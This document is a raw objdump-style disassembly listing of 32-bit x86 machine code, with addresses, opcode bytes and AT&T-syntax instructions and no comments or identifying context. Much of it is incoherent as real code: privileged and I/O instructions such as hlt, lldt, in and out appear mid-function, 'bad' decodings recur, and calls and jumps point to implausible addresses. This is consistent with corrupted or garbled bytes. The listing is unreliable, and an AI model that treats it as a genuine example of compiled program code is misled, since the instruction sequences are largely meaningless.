  40613f:	8a 89 82 ff f6 43    	mov    0x43f6ff82(%ecx),%cl
  406145:	12 04 74             	adc    (%esp,%esi,2),%al
  406148:	52                   	push   %edx
  406149:	8b 90 13 10 2b 00    	mov    0x2b1013(%eax),%edx
  40614f:	33 c9                	xor    %ecx,%ecx
  406151:	85 ce                	test   %ecx,%esi
  406153:	32 12                	xor    (%edx),%dl
  406155:	e0 b0                	loopne 0x406107
  406157:	14 10                	adc    $0x10,%al
  406159:	da 00                	fiaddl (%eax)
  40615b:	39 3e                	cmp    %edi,(%esi)
  40615d:	74 08                	je     0x406167
  40615f:	41                   	inc    %ecx
  406160:	f7 c3 04 3b ca 72    	test   $0x72ca3b04,%ebx
  406166:	f4                   	hlt
  406167:	3b ca                	cmp    %edx,%ecx
  406169:	75 1c                	jne    0x406187
  40616b:	e3 fa                	jecxz  0x406167
  40616d:	00 89 00 00 73 14    	add    %cl,0x14730000(%ecx)
  406173:	89 bc 88 14 f3 00 39 	mov    %edi,0x3900f314(%eax,%ecx,4)
  40617a:	a1 88 10 10 00       	mov    0x101088,%eax
  40617f:	00 41 89             	add    %al,-0x77(%ecx)
  406182:	88 10                	mov    %dl,(%eax)
  406184:	fa                   	cli
  406185:	00 af f6 43 00 72    	add    %ch,0x720043f6(%edi)
  40618b:	23 88 2d 90 70 20    	and    0x2070902d(%eax),%ecx
  406191:	00 a2 33 c9 88 d2    	add    %ah,-0x2d7736cd(%edx)
  406197:	76 12                	jbe    0x4061ab
  406199:	8d b0 18 9f 00 00    	lea    0x9f18(%eax),%esi
  40619f:	39 5e 74             	cmp    %ebx,0x74(%esi)
  4061a2:	08 93 83 c6 04 3b    	or     %dl,0x3b04c683(%ebx)
  4061a8:	ca 72 50             	lret   $0x5072
  4061ab:	3b e1                	cmp    %ecx,%esp
  4061ad:	75 1c                	jne    0x4061cb
  4061af:	d6                   	salc
  4061b0:	fa                   	cli
  4061b1:	00 04 00             	add    %al,(%eax,%eax,1)
  4061b4:	00 73 14             	add    %dh,0x14(%ebx)
  4061b7:	89 bc fa 18 20 00 00 	mov    %edi,0x2018(%edx,%edi,8)
  4061be:	00 73 14             	add    %dh,0x14(%ebx)
  4061c1:	20 00                	and    %al,(%eax)
  4061c3:	00 41 89             	add    %al,-0x77(%ecx)
  4061c6:	69 14 95 0f 78 08 b8 	imul   $0x86a3b6,-0x47f787f1(,%edx,4),%edx
  4061cd:	b6 a3 86 00 
  4061d1:	7e 06                	jle    0x4061d9
  4061d3:	89 55 18             	mov    %edx,0x18(%ebp)
  4061d6:	f4                   	hlt
  4061d7:	1d 00 8b 48 04       	sbb    $0x4488b00,%eax
  4061dc:	ac                   	lods   %ds:(%esi),%al
  4061dd:	41                   	inc    %ecx
  4061de:	5e                   	pop    %esi
  4061df:	89 48 04             	mov    %ecx,0x4(%eax)
  4061e2:	c9                   	leave
  4061e3:	c0 5b 5d c2          	rcrb   $0xc2,0x5d(%ebx)
  4061e7:	08 36                	or     %dh,(%esi)
  4061e9:	5f                   	pop    %edi
  4061ea:	5e                   	pop    %esi
  4061eb:	a2 09 05 00 00       	mov    %al,0x509
  4061f0:	5b                   	pop    %ebx
  4061f1:	5d                   	pop    %ebp
  4061f2:	f4                   	hlt
  4061f3:	08 00                	or     %al,(%eax)
  4061f5:	90                   	nop
  4061f6:	90                   	nop
  4061f7:	90                   	nop
  4061f8:	90                   	nop
  4061f9:	90                   	nop
  4061fa:	1c 90                	sbb    $0x90,%al
  4061fc:	90                   	nop
  4061fd:	90                   	nop
  4061fe:	2d ba 05 8b ec       	sub    $0xec8b05ba,%eax
  406203:	83 ec 08             	sub    $0x8,%esp
  406206:	8b 45 0c             	mov    0xc(%ebp),%eax
  406209:	53                   	push   %ebx
  40620a:	56                   	push   %esi
  40620b:	57                   	push   %edi
  40620c:	ad                   	lods   %ds:(%esi),%eax
  40620d:	78 04                	js     0x406213
  40620f:	01 0f                	add    %ecx,(%edi)
  406211:	85 77 01             	test   %esi,0x1(%edi)
  406214:	00 00                	add    %al,(%eax)
  406216:	40                   	inc    %eax
  406217:	58                   	pop    %eax
  406218:	0c 8b                	or     $0x8b,%al
  40621a:	45                   	inc    %ebp
  40621b:	08 33                	or     %dh,(%ebx)
  40621d:	c9                   	leave
  40621e:	8b 50 99             	mov    -0x67(%eax),%edx
  406221:	8b 7b 04             	mov    0x4(%ebx),%edi
  406224:	85 d2                	test   %edx,%edx
  406226:	89 88 f8 76 34 8b    	mov    %ecx,-0x74cb8908(%eax)
  40622c:	b0 1c                	mov    $0x1c,%al
  40622e:	30 00                	xor    %al,(%eax)
  406230:	00 25 c6 0c 3b 2d    	add    %ah,0x2d3b0cc6
  406236:	74 16                	je     0x40624e
  406238:	ae                   	scas   %es:(%edi),%al
  406239:	bc c6 bc 3b 15       	mov    $0x153bbcc6,%esp
  40623e:	72 f4                	jb     0x406234
  406240:	08 5e b8             	or     %bl,-0x48(%esi)
  406243:	7f 11                	jg     0x406256
  406245:	5f                   	pop    %edi
  406246:	00 5b 26             	add    %bl,0x26(%ebx)
  406249:	e5 5d                	in     $0x5d,%eax
  40624b:	13 08                	adc    (%eax),%ecx
  40624d:	00 8b b6 41 8d 72    	add    %cl,0x728d41b6(%ebx)
  406253:	ff b0 02 89 70 04    	push   0x4708902(%eax)
  406259:	85 4f 8d             	test   %ecx,-0x73(%edi)
  40625c:	e3 be                	jecxz  0x40621c
  40625e:	8d 6f 89             	lea    -0x77(%edi),%ebp
  406261:	de e3                	fsubp  %st,%st(3)
  406263:	02 90 e7 02 2b d1    	add    -0x2ed4fd19(%eax),%dl
  406269:	7c 7d                	jl     0x4062e8
  40626b:	08 89 55 fc ed 42    	or     %cl,0x42edfc55(%ecx)
  406271:	1c 30                	sbb    $0x30,%al
  406273:	00 00                	add    %al,(%eax)
  406275:	07                   	pop    %es
  406276:	55                   	push   %ebp
  406277:	5f                   	pop    %edi
  406278:	8b 52 0c             	mov    0xc(%edx),%edx
  40627b:	8d 85 86 3b 56 0c    	lea    0xc563b86(%ebp),%eax
  406281:	75 05                	jne    0x406288
  406283:	34 48                	xor    $0x48,%al
  406285:	04 eb                	add    $0xeb,%al
  406287:	10 19                	adc    %bl,(%ecx)
  406289:	3c 0b                	cmp    $0xb,%al
  40628b:	b9 05 00 99 c5       	mov    $0xc5990005,%ecx
  406290:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406292:	d9 7d 08             	fnstcw 0x8(%ebp)
  406295:	83 ca 14             	or     $0x14,%edx
  406298:	8b 4d 4f             	mov    0x4f(%ebp),%ecx
  40629b:	83 94 14 49 89 7d f7 	adcl   $0xffffffcb,-0x88276b7(%esp,%edx,1)
  4062a2:	cb 
  4062a3:	d3 fc                	sar    %cl,%esp
  4062a5:	75 c8                	jne    0x40626f
  4062a7:	93                   	xchg   %eax,%ebx
  4062a8:	7d f8                	jge    0x4062a2
  4062aa:	8b 50 0c             	mov    0xc(%eax),%edx
  4062ad:	f5                   	cmc
  4062ae:	c9                   	leave
  4062af:	85 d2                	test   %edx,%edx
  4062b1:	76 2e                	jbe    0x4062e1
  4062b3:	8d 70 2d             	lea    0x2d(%eax),%esi
  4062b6:	39 f8                	cmp    %edi,%eax
  4062b8:	74 0a                	je     0x4062c4
  4062ba:	41                   	inc    %ecx
  4062bb:	83 c6 04             	add    $0x4,%esi
  4062be:	94                   	xchg   %eax,%esp
  4062bf:	ca 72 f4             	lret   $0xf472
  4062c2:	eb 1d                	jmp    0x4062e1
  4062c4:	4a                   	dec    %edx
  4062c5:	3b ed                	cmp    %ebp,%ebp
  4062c7:	73 15                	jae    0x4062de
  4062c9:	8d 54 88 10          	lea    0x10(%eax,%ecx,4),%edx
  4062cd:	8b 72 04             	mov    0x4(%edx),%esi
  4062d0:	41                   	inc    %ecx
  4062d1:	89 32                	mov    %esi,(%edx)
  4062d3:	8b 70 0c             	mov    0xc(%eax),%esi
  4062d6:	83 9e d4 4e 3b 1c 72 	sbbl   $0x72,0x1c3b4ed4(%esi)
  4062dd:	ef                   	out    %eax,(%dx)
  4062de:	ff 48 0c             	decl   0xc(%eax)
  4062e1:	8b e0                	mov    %eax,%esp
  4062e3:	10 10                	adc    %dl,(%eax)
  4062e5:	00 00                	add    %al,(%eax)
  4062e7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4062e8:	c9                   	leave
  4062e9:	85 4e 2b             	test   %ecx,0x2b(%esi)
  4062ec:	11 8d b0 14 10 00    	adc    %ecx,0x1014b0(%ebp)
  4062f2:	00 39                	add    %bh,(%ecx)
  4062f4:	3e 74 0a             	je,pt  0x406301
  4062f7:	41                   	inc    %ecx
  4062f8:	83 c6 87             	add    $0xffffff87,%esi
  4062fb:	a9 ca 72 f4 eb       	test   $0xebf472ca,%eax
  406300:	26 4a                	es dec %edx
  406302:	3b ca                	cmp    %edx,%ecx
  406304:	73 bd                	jae    0x4062c3
  406306:	8d 94 88 14 10 00 00 	lea    0x1014(%eax,%ecx,4),%edx
  40630d:	8b 72 04             	mov    0x4(%edx),%esi
  406310:	41                   	inc    %ecx
  406311:	89 32                	mov    %esi,(%edx)
  406313:	8b 69 10             	mov    0x10(%ecx),%ebp
  406316:	89 00                	mov    %eax,(%eax)
  406318:	00 83 c2 8c 4e 3b    	add    %al,0x3b4e8cc2(%ebx)
  40631e:	ce                   	into
  40631f:	72 49                	jb     0x40636a
  406321:	ff 88 60 10 00 00    	decl   0x1060(%eax)
  406327:	4f                   	dec    %edi
  406328:	90                   	nop
  406329:	16                   	push   %ss
  40632a:	20 00                	and    %al,(%eax)
  40632c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40632d:	33 c9                	xor    %ecx,%ecx
  40632f:	85 d2                	test   %edx,%edx
  406331:	76 3a                	jbe    0x40636d
  406333:	8d b0 18 20 00 dc    	lea    -0x23ffdfe8(%eax),%esi
  406339:	39 3e                	cmp    %edi,(%esi)
  40633b:	74 0a                	je     0x406347
  40633d:	41                   	inc    %ecx
  40633e:	df c6                	ffreep %st(6)
  406340:	04 3b                	add    $0x3b,%al
  406342:	ca 72 f4             	lret   $0xf472
  406345:	1a 24 4a             	sbb    (%edx,%ecx,2),%ah
  406348:	3b ca                	cmp    %edx,%ecx
  40634a:	73 07                	jae    0x406353
  40634c:	e4 94                	in     $0x94,%al
  40634e:	17                   	pop    %ss
  40634f:	02 20                	add    (%eax),%ah
  406351:	00 34 8b             	add    %dh,(%ebx,%ecx,4)
  406354:	7f 04                	jg     0x40635a
  406356:	c2 89 32             	ret    $0x3289
  406359:	8b b0 14 0f 7b 00    	mov    0x7b0f14(%eax),%esi
  40635f:	83 c2 04             	add    $0x4,%edx
  406362:	4e                   	dec    %esi
  406363:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406364:	ce                   	into
  406365:	72 ec                	jb     0x406353
  406367:	98                   	cwtl
  406368:	88 8a 20 f3 00 8b    	mov    %cl,-0x74ff0ce0(%edx)
  40636e:	88 18                	mov    %bl,(%eax)
  406370:	06                   	push   %es
  406371:	00 00                	add    %al,(%eax)
  406373:	aa                   	stos   %al,%es:(%edi)
  406374:	f9                   	stc
  406375:	75 69                	jne    0x4063e0
  406377:	85 c9                	test   %ecx,%ecx
  406379:	7e 07                	jle    0x406382
  40637b:	49                   	dec    %ecx
  40637c:	89 41 69             	mov    %eax,0x69(%ecx)
  40637f:	30 00                	xor    %al,(%eax)
  406381:	00 5f 5e             	add    %bl,0x5e(%edi)
  406384:	33 c0                	xor    %eax,%eax
  406386:	aa                   	stos   %al,%es:(%edi)
  406387:	8b e5                	mov    %ebp,%esp
  406389:	4d                   	dec    %ebp
  40638a:	c2 08 3d             	ret    $0x3d08
  40638d:	4f                   	dec    %edi
  40638e:	5e                   	pop    %esi
  40638f:	13 09                	adc    (%ecx),%ecx
  406391:	3a ee                	cmp    %dh,%ch
  406393:	00 5b 8b             	add    %bl,-0x75(%ebx)
  406396:	0e                   	push   %cs
  406397:	5d                   	pop    %ebp
  406398:	18 08                	sbb    %cl,(%eax)
  40639a:	00 90 90 ff 90 90    	add    %dl,-0x6f6f0070(%eax)
  4063a0:	93                   	xchg   %eax,%ebx
  4063a1:	8b ec                	mov    %esp,%ebp
  4063a3:	b8 92 30 2a 00       	mov    $0x2a3092,%eax
  4063a8:	e8 93 54 38 00       	call   0x78b840
  4063ad:	53                   	push   %ebx
  4063ae:	92                   	xchg   %eax,%edx
  4063af:	5d                   	pop    %ebp
  4063b0:	08 56 84             	or     %dl,-0x7c(%esi)
  4063b3:	8b 43 ad             	mov    -0x53(%ebx),%eax
  4063b6:	85 c0                	test   %eax,%eax
  4063b8:	d9 14 cb             	fsts   (%ebx,%ecx,8)
  4063bb:	45                   	inc    %ebp
  4063bc:	14 5f                	adc    $0x5f,%al
  4063be:	5e                   	pop    %esi
  4063bf:	5b                   	pop    %ebx
  4063c0:	c7 00 00 00 00 f5    	movl   $0xf5000000,(%eax)
  4063c6:	33 c0                	xor    %eax,%eax
  4063c8:	8b e5                	mov    %ebp,%esp
  4063ca:	5d                   	pop    %ebp
  4063cb:	c2 14 00             	ret    $0x14
  4063ce:	8b 75 10             	mov    0x10(%ebp),%esi
  4063d1:	26 7d c7             	es jge 0x40639b
  4063d4:	5a                   	pop    %edx
  4063d5:	32 7f 0a             	xor    0xa(%edi),%bh
  4063d8:	7c 04                	jl     0x4063de
  4063da:	85 ff                	test   %edi,%edi
  4063dc:	73 02                	jae    0x4063e0
  4063de:	33 3a                	xor    (%edx),%edi
  4063e0:	eb 25                	jmp    0x406407
  4063e2:	6a 00                	push   $0x0
  4063e4:	68 40 42 40 2c       	push   $0x2c404240
  4063e9:	56                   	push   %esi
  4063ea:	f6 e8                	imul   %al
  4063ec:	a0 51 e1 00 da       	mov    0xda00e151,%al
  4063f1:	00 68 40             	add    %ch,0x40(%eax)
  4063f4:	42                   	inc    %edx
  4063f5:	0f 00 56 57          	lldt   0x57(%esi)
  4063f9:	ad                   	lods   %ds:(%esi),%eax
  4063fa:	45                   	inc    %ebp
  4063fb:	ec                   	in     (%dx),%al
  4063fc:	e8 4f 53 00 82       	call   0x8240b750
  406401:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406404:	56                   	push   %esi
  406405:	83 1b b9             	sbbl   $0xffffffb9,(%ebx)
  406408:	ab                   	stos   %eax,%es:(%edi)
  406409:	04 00                	add    $0x0,%al
  40640b:	00 8d 7e 0c 57 60    	add    %cl,0x60570c7e(%ebp)
  406411:	e4 df                	in     $0xdf,%al
  406413:	ff                   	ljmp   (bad)
  406414:	ef                   	out    %eax,(%dx)
  406415:	50                   	push   %eax
  406416:	40                   	inc    %eax
  406417:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406418:	b9 01 04 51 00       	mov    $0x510401,%ecx
  40641d:	8d b3 10 73 00 00    	lea    0x7310(%ebx),%esi
  406423:	8d bd e8 0c ff ff    	lea    -0xf318(%ebp),%edi
  406429:	8d 95 2d ef ff ff    	lea    -0x10d3(%ebp),%edx
  40642f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406431:	b9 bd 5b 00 00       	mov    $0x5bbd,%ecx
  406436:	82 b3 14 20 00 00 8d 	xorb   $0x8d,0x2014(%ebx)
  40643d:	20 e0                	and    %ah,%al
  40643f:	cf                   	iret
  406440:	ff                   	(bad)
  406441:	ff 8d f8 e4 df ff    	decl   -0x201b08(%ebp)
  406447:	f7 f3                	div    %ebx
  406449:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40644a:	8d 75 e0             	lea    -0x20(%ebp),%esi
  40644d:	25 ff ff 51 8b       	and    $0x8b51ffff,%eax
  406452:	8b 18                	mov    (%eax),%ebx
  406454:	30 00                	xor    %al,(%eax)
  406456:	00 52 41             	add    %dl,0x41(%edx)
  406459:	50                   	push   %eax
  40645a:	51                   	push   %ecx
  40645b:	f6 15 c4 c1 40 00    	notb   0x40c1c4
  406461:	8b 55 14             	mov    0x14(%ebp),%edx
  406464:	33 ed                	xor    %ebp,%ebp
  406466:	3b c7                	cmp    %edi,%eax
  406468:	89 02                	mov    %eax,(%edx)
  40646a:	7d 20                	jge    0x40648c
  40646c:	8b cb                	mov    %ebx,%ecx
  40646e:	9d                   	popf
  40646f:	c1 40 e6 ff          	roll   $0xff,-0x1a(%eax)
  406473:	d6                   	salc
  406474:	85 2f                	test   %ebp,(%edi)
  406476:	cf                   	iret
  406477:	84 57 01             	test   %dl,0x1(%edi)
  40647a:	e5 00                	in     $0x0,%eax
  40647c:	fd                   	std
  40647d:	d6                   	salc
  40647e:	f6 5e 05             	negb   0x5(%esi)
  406481:	80 fc 0a             	cmp    $0xa,%ah
  406484:	d5 5b                	aad    $0x5b
  406486:	8b e5                	mov    %ebp,%esp
  406488:	57                   	push   %edi
  406489:	c2 14 00             	ret    $0x14
  40648c:	75 0e                	jne    0x40649c
  40648e:	5f                   	pop    %edi
  40648f:	5e                   	pop    %esi
  406490:	b8 77 11 d1 00       	mov    $0xd11177,%eax
  406495:	8d                   	lea    (bad),%edx
  406496:	d0 e5                	shl    $1,%ch
  406498:	5d                   	pop    %ebp
  406499:	c2 14 00             	ret    $0x14
  40649c:	8b 43 04             	mov    0x4(%ebx),%eax
  40649f:	89 7d 1b             	mov    %edi,0x1b(%ebp)
  4064a2:	3b c1                	cmp    %ecx,%eax
  4064a4:	89 7d f8             	mov    %edi,-0x8(%ebp)
  4064a7:	0f 86 0f 01 00 00    	jbe    0x4065bc
  4064ad:	89 7d 08             	mov    %edi,0x8(%ebp)
  4064b0:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4064b3:	8b 83 1c 2e 00 00    	mov    0x2e1c(%ebx),%eax
  4064b9:	03 c7                	add    %edi,%eax
  4064bb:	d0 78 32             	sarb   $1,0x32(%eax)
  4064be:	01 0f                	add    %ecx,(%edi)
  4064c0:	85 19                	test   %ebx,(%ecx)
  4064c2:	01 0e                	add    %ecx,(%esi)
  4064c4:	00 8b 4a 0c a3 95    	add    %cl,-0x6a5cf3b6(%ebx)
  4064ca:	e4 b1                	in     $0xb1,%al
  4064cc:	ff 6e 0e             	ljmp   *0xe(%esi)
  4064cf:	02 71 04             	add    0x4(%ecx),%dh
  4064d2:	56                   	push   %esi
  4064d3:	89 75 f4             	mov    %esi,-0xc(%ebp)
  4064d6:	e8 85 54 00 00       	call   0x40b960
  4064db:	28 c0                	sub    %al,%al
  4064dd:	0a 26                	or     (%esi),%ah
  4064df:	8d                   	lea    (bad),%ebx
  4064e0:	d8 e8                	fsubr  %st(0),%st
  4064e2:	ef                   	out    %eax,(%dx)
  4064e3:	ff                   	(bad)
  4064e4:	ff 50 33             	call   *0x33(%eax)
  4064e7:	ee                   	out    %al,(%dx)
  4064e8:	74 54                	je     0x40653e
  4064ea:	00 00                	add    %al,(%eax)
  4064ec:	85 57 4e             	test   %edx,0x4e(%edi)
  4064ef:	13 8d 8d e0 cf ff    	adc    -0x301f73(%ebp),%ecx
  4064f5:	ff 51 56             	call   *0x56(%ecx)
  4064f8:	e8 95 54 00 00       	call   0x40b992
  4064fd:	ae                   	scas   %es:(%edi),%al
  4064fe:	c0 0f 84             	rorb   $0x84,(%edi)
  406501:	9d                   	popf
  406502:	00 7b 00             	add    %bh,0x0(%ebx)
  406505:	28 b3 1c 8c 00 00    	sub    %dh,0x8c1c(%ebx)
  40650b:	8b 5a 08             	mov    0x8(%edx),%ebx
  40650e:	03 f7                	add    %edi,%esi
  406510:	8b bb 20 30 00 00    	mov    0x3020(%ebx),%edi
  406516:	03 f8                	add    %eax,%edi
  406518:	68 05 00 00 2a       	push   $0x2a000005
  40651d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40651f:	8b 93 e2 fd 00 50    	mov    0x5000fde2(%ebx),%edx
  406525:	8b 7d f4             	mov    -0xc(%ebp),%edi
  406528:	66 c7 44 02 0a e4 00 	movw   $0xe4,0xa(%edx,%eax,1)
  40652f:	61                   	popa
  406530:	85 d0                	test   %edx,%eax
  406532:	df ff                	(bad)
  406534:	ff 50 57             	call   *0x57(%eax)
  406537:	e8 24 54 00 00       	call   0x40b960
  40653c:	8b 75 08             	mov    0x8(%ebp),%esi
  40653f:	85 c0                	test   %eax,%eax
  406541:	74 0f                	je     0x406552
  406543:	8b 8b 79 a5 00 00    	mov    0xa579(%ebx),%ecx
  406549:	80 4c 31 e4 01       	orb    $0x1,-0x1c(%ecx,%esi,1)
  40654e:	8d 44 31 0a          	lea    0xa(%ecx,%esi,1),%eax
  406552:	8d 95 e8 ef ff d0    	lea    -0x2f001018(%ebp),%edx
  406558:	52                   	push   %edx
  406559:	57                   	push   %edi
  40655a:	e8 45 54 00 d1       	call   0xd140b9a4
  40655f:	85 c0                	test   %eax,%eax
  406561:	74 0f                	je     0x406572
  406563:	8b 83 20 30 00 00    	mov    0x3020(%ebx),%eax
  406569:	75 4c                	jne    0x4065b7
  40656b:	30 0a                	xor    %cl,(%edx)
  40656d:	04 8d                	add    $0x8d,%al
  40656f:	44                   	inc    %esp
  406570:	50                   	push   %eax
  406571:	0a 8d 8d e0 cf ff    	or     -0x301f73(%ebp),%cl
  406577:	ff 51 57             	call   *0x57(%ecx)
  40657a:	d8 e1                	fsub   %st(1),%st
  40657c:	53                   	push   %ebx
  40657d:	00 00                	add    %al,(%eax)
  40657f:	85 c0                	test   %eax,%eax
  406581:	74 0f                	je     0x406592
  406583:	8b 93 20 30 00 00    	mov    0x3020(%ebx),%edx
  406589:	80 60 32 0a          	andb   $0xa,0x32(%eax)
  40658d:	10 8d 34 dc 0a 8b    	adc    %cl,-0x74f523cc(%ebp)
  406593:	13 10                	adc    (%eax),%edx
  406595:	8b 7d fc             	mov    -0x4(%ebp),%edi
  406598:	41                   	inc    %ecx
  406599:	83 c6 80             	add    $0xffffff80,%esi
  40659c:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40659f:	89 a6 08 8b 45 f8    	mov    %esp,-0x7ba74f8(%esi)
  4065a5:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4065a8:	40                   	inc    %eax
  4065a9:	83 c7 14             	add    $0x14,%edi
  4065ac:	6c                   	insb   (%dx),%es:(%edi)
  4065ad:	c1 89 45 36 89 46 fc 	rorl   $0xfc,0x46893645(%ecx)
  4065b4:	ab                   	stos   %eax,%es:(%edi)
  4065b5:	82 f9 fe             	cmp    $0xfe,%cl
  4065b8:	ff                   	(bad)
  4065b9:	ff 33                	push   (%ebx)
  4065bb:	ff 0b                	decl   (%ebx)
  4065bd:	4d                   	dec    %ebp
  4065be:	14 8b                	adc    $0x8b,%al
  4065c0:	4c                   	dec    %esp
  4065c1:	e9 89 01 33 45       	jmp    0x4573674f
  4065c6:	71 3b                	jno    0x406603
  4065c8:	c7                   	(bad)
  4065c9:	74 08                	je     0x4065d3
  4065cb:	9b                   	fwait
  4065cc:	ef                   	out    %eax,(%dx)
  4065cd:	20 30                	and    %dh,(%eax)
  4065cf:	00 00                	add    %al,(%eax)
  4065d1:	89 10                	mov    %edx,(%eax)
  4065d3:	5f                   	pop    %edi
  4065d4:	5e                   	pop    %esi
  4065d5:	33 c0                	xor    %eax,%eax
  4065d7:	1f                   	pop    %ds
  4065d8:	8b e5                	mov    %ebp,%esp
  4065da:	ff c2                	inc    %edx
  4065dc:	14 00                	adc    $0x0,%al
  4065de:	5f                   	pop    %edi
  4065df:	5e                   	pop    %esi
  4065e0:	b8 09 3d 1f 9b       	mov    $0x9b1f3d09,%eax
  4065e5:	5b                   	pop    %ebx
  4065e6:	8b f2                	mov    %edx,%esi
  4065e8:	5d                   	pop    %ebp
  4065e9:	7e 6f                	jle    0x40665a
  4065eb:	00 90 90 23 90 55    	add    %dl,0x55902390(%eax)
  4065f1:	8b ec                	mov    %esp,%ebp
  4065f3:	53                   	push   %ebx
  4065f4:	56                   	push   %esi
  4065f5:	57                   	push   %edi
  4065f6:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4065f9:	80 ff 75             	cmp    $0x75,%bh
  4065fc:	05 bf b6 00 00       	add    $0xb6bf,%eax
  406601:	00 8b 45 18 e6 75    	add    %cl,0x75e61845(%ebx)
  406607:	08 50 56             	or     %dl,0x56(%eax)
  40660a:	e8 71 01 de 00       	call   0x11e6780
  40660f:	8b 5d 14             	mov    0x14(%ebp),%ebx
  406612:	00 4d 10             	add    %cl,0x10(%ebp)
  406615:	83 4e 08 53          	orl    $0x53,0x8(%esi)
  406619:	51                   	push   %ecx
  40661a:	ff                   	(bad)
  40661b:	ff 15 bc c1 ad 49    	call   *0x49adc1bc
  406621:	8b 16                	mov    (%esi),%edx
  406623:	dd 42 04             	fldl   0x4(%edx)
  406626:	8b 06                	mov    (%esi),%eax
  406628:	8b 40 04             	mov    0x4(%eax),%eax
  40662b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40662e:	75 1e                	jne    0x40664e
  406630:	8b 35 d8 c1 40 00    	mov    0x40c1d8,%esi
  406636:	ff d6                	call   *%esi
  406638:	85 c0                	test   %eax,%eax
  40663a:	0f 84 94 00 00 00    	je     0x4066d4
  406640:	43                   	inc    %ebx
  406641:	d6                   	salc
  406642:	5f                   	pop    %edi
  406643:	5e                   	pop    %esi
  406644:	29 80 fc 13 00 5b    	sub    %eax,0x5b0013fc(%eax)
  40664a:	5d                   	pop    %ebp
  40664b:	c2 14 00             	ret    $0x14
  40664e:	83 3d 10 08 41 00 14 	cmpl   $0x14,0x410810
  406655:	7c 0d                	jl     0x406664
  406657:	6a 00                	push   $0x0
  406659:	6a ec                	push   $0xffffffec
  40665b:	50                   	push   %eax
  40665c:	ff 15 70 c0 40 54    	call   *0x5440c070
  406662:	46                   	inc    %esi
  406663:	3e ff                	ds (bad)
  406665:	fc                   	cld
  406666:	85 c0                	test   %eax,%eax
  406668:	ff 00                	incl   (%eax)
  40666a:	8b 16                	mov    (%esi),%edx
  40666c:	6a 02                	push   $0x2
  40666e:	6a 00                	push   $0x0
  406670:	fd                   	std
  406671:	70 0c                	jo     0x40667f
  406673:	6a 00                	push   $0x0
  406675:	51                   	push   %ecx
  406676:	8b 4a 04             	mov    0x4(%edx),%ecx
  406679:	50                   	push   %eax
  40667a:	06                   	push   %es
  40667b:	50                   	push   %eax
  40667c:	ff 8f 68 c0 40 00    	decl   0x40c068(%edi)
  406682:	85 c0                	test   %eax,%eax
  406684:	ba 14 8b 16 8b       	mov    $0x8b168b14,%edx
  406689:	46                   	inc    %esi
  40668a:	04 50                	add    $0x50,%al
  40668c:	ff 15 c0 37 40 00    	call   *0x4037c0
  406692:	8b 0e                	mov    (%esi),%ecx
  406694:	8b 55 0c             	mov    0xc(%ebp),%edx
  406697:	89 51 04             	mov    %edx,0x4(%ecx)
  40669a:	48                   	dec    %eax
  40669b:	45                   	inc    %ebp
  40669c:	a1 8b 0e 53 b9       	mov    0xb9530e8b,%eax
  4066a1:	57                   	push   %edi
  4066a2:	44                   	inc    %esp
  4066a3:	e8 fc 00 b1 00       	call   0xf167a4
  4066a8:	8b 5c 83 c8          	mov    -0x38(%ebx,%eax,4),%ebx
  4066ac:	ff 83 c4 10 89 42    	incl   0x428910c4(%ebx)
  4066b2:	56                   	push   %esi
  4066b3:	68 20 57 40 00       	push   $0x405720
  4066b8:	68 e0 1e 40 00       	push   $0x401ee0
  4066bd:	89 42 03             	mov    %eax,0x3(%edx)
  4066c0:	8b 06                	mov    (%esi),%eax
  4066c2:	c7 40 28 00 00 00 00 	movl   $0x0,0x28(%eax)
  4066c9:	8b 36                	mov    (%esi),%esi
  4066cb:	56                   	push   %esi
  4066cc:	8b 0e                	mov    (%esi),%ecx
  4066ce:	51                   	push   %ecx
  4066cf:	14 2c                	adc    $0x2c,%al
  4066d1:	ef                   	out    %eax,(%dx)
  4066d2:	ff                   	(bad)
  4066d3:	ff 5f 00             	lcall  *0x0(%edi)
  4066d6:	33 c0                	xor    %eax,%eax
  4066d8:	01 5d 33             	add    %ebx,0x33(%ebp)
  4066db:	14 00                	adc    $0x0,%al
  4066dd:	90                   	nop
  4066de:	90                   	nop
  4066df:	90                   	nop
  4066e0:	3f                   	aas
  4066e1:	e1 ec                	loope  0x4066cf
  4066e3:	6a 8b                	push   $0xffffff8b
  4066e5:	75 08                	jne    0x4066ef
  4066e7:	8b dc                	mov    %esp,%ebx
  4066e9:	04 83                	add    $0x83,%al
  4066eb:	f8                   	clc
  4066ec:	ff 74 29 2b          	push   0x2b(%ecx,%ebp,1)
  4066f0:	ff f2                	push   %edx
  4066f2:	c0 e9 40             	shr    $0x40,%cl
  4066f5:	00 83 f8 ff d3 58    	add    %al,0x58d3fff8(%ebx)
  4066fb:	8b 2e                	mov    (%esi),%ebp
  4066fd:	d8 c1                	fadd   %st(1),%st
  4066ff:	9e                   	sahf
  406700:	00 f5                	add    %dh,%ch
  406702:	d6                   	salc
  406703:	85 99 54 29 ff d6    	test   %ebx,-0x2900d6ac(%ecx)
  406709:	05 c1 fc 0a 00       	add    $0xafcc1,%eax
  40670e:	5e                   	pop    %esi
  40670f:	5d                   	pop    %ebp
  406710:	c3                   	ret
  406711:	0e                   	push   %cs
  406712:	46                   	inc    %esi
  406713:	41                   	inc    %ecx
  406714:	ff                   	(bad)
  406715:	ff                   	(bad)
  406716:	ff                   	(bad)
  406717:	ff 8b 46 40 eb c0    	decl   -0x3f14bfba(%ebx)
  40671d:	b6 bc                	mov    $0xbc,%dh
  40671f:	8b 40 10             	mov    0x10(%eax),%eax
  406722:	50                   	push   %eax
  406723:	ff 15 a8 0b 40 00    	call   *0x400ba8
  406729:	d6                   	salc
  40672a:	46                   	inc    %esi
  40672b:	40                   	inc    %eax
  40672c:	00 00                	add    %al,(%eax)
  40672e:	00 00                	add    %al,(%eax)
  406730:	33 c0                	xor    %eax,%eax
